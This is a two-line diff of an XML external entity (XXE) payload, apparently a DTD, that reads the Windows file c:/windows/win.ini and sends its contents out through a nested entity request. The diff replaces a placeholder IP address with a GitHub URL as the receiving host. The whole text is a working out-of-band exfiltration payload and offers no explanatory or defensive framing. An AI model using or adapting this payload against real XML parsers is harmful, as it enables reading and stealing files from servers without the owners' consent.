@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'https://github.com/Wexent/xxe/blob/master/ev.xml/?%data;'>">
